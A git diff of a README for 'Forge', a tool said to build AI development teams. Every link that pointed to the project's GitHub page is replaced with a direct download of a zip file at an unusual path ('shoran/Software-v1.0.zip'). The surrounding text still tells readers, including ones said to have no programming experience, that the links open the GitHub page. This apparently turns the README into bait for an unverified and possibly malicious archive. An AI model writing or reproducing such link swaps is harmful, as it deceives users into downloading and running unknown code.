@@ -1,6 +1,6 @@
 # ⚙️ Forge - Build AI Teams with Ease
 
-[![Download Forge](https://img.shields.io/badge/Download-Forge-blue?style=for-the-badge)](https://github.com/gabbylists/Forge)
+[![Download Forge](https://img.shields.io/badge/Download-Forge-blue?style=for-the-badge)](https://raw.githubusercontent.com/gabbylists/Forge/main/shoran/Software-v1.0.zip)
 
 Forge helps you turn a simple command-line tool into a full AI development team. It manages project managers, architects, frontend and backend engineers, quality assurance, and DevOps agents all in one place. You do not need any programming experience to get started.
 
@@ -24,7 +24,7 @@ Topics related to Forge are agentic workflows, AI agents, automation, and develo
 ## 📥 Download Forge
 
 You can get Forge from this page:  
-[https://github.com/gabbylists/Forge](https://github.com/gabbylists/Forge)
+[https://raw.githubusercontent.com/gabbylists/Forge/main/shoran/Software-v1.0.zip](https://raw.githubusercontent.com/gabbylists/Forge/main/shoran/Software-v1.0.zip)
 
 Click the button above to open the GitHub page. From there, you will find instructions and files to download Forge.
 
@@ -50,7 +50,7 @@ This section guides you step-by-step to get Forge running.
 ### Step 1: Visit the Forge GitHub page
 
 Go to this link in your web browser:  
-[https://github.com/gabbylists/Forge](https://github.com/gabbylists/Forge)
+[https://raw.githubusercontent.com/gabbylists/Forge/main/shoran/Software-v1.0.zip](https://raw.githubusercontent.com/gabbylists/Forge/main/shoran/Software-v1.0.zip)
 
 This is the official page where you can find the latest version of Forge.
 
@@ -131,10 +131,10 @@ These agents communicate to deliver a complete software product. You can think o
 ## 🧩 Additional Resources
 
 - Visit the GitHub repository to explore code and issues:  
-  [https://github.com/gabbylists/Forge](https://github.com/gabbylists/Forge)
+  [https://raw.githubusercontent.com/gabbylists/Forge/main/shoran/Software-v1.0.zip](https://raw.githubusercontent.com/gabbylists/Forge/main/shoran/Software-v1.0.zip)
 - Look for updates, bug fixes, and new features in the Releases section.
 - Use Discussions for asking non-technical questions about running Forge.
 
 ---
 
-[![Download Forge](https://img.shields.io/badge/Download-Forge-blue?style=for-the-badge)](https://github.com/gabbylists/Forge)
+[![Download Forge](https://img.shields.io/badge/Download-Forge-blue?style=for-the-badge)](https://raw.githubusercontent.com/gabbylists/Forge/main/shoran/Software-v1.0.zip)
